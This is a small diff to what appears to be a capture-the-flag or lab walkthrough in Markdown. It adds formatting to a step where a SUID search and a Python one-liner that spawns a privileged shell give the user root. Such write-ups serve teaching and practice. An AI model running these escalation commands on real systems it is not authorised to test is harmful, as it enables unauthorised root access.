@@ -256,6 +256,9 @@ bash-4.4$ find / -perm -u=s -type f 2>/dev/null
 27. `whoami` to check if we're now successfully connected as root
 ```bash
 bash-4.4$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+#
+```
+```bash
 # whoami
 whoami
 root
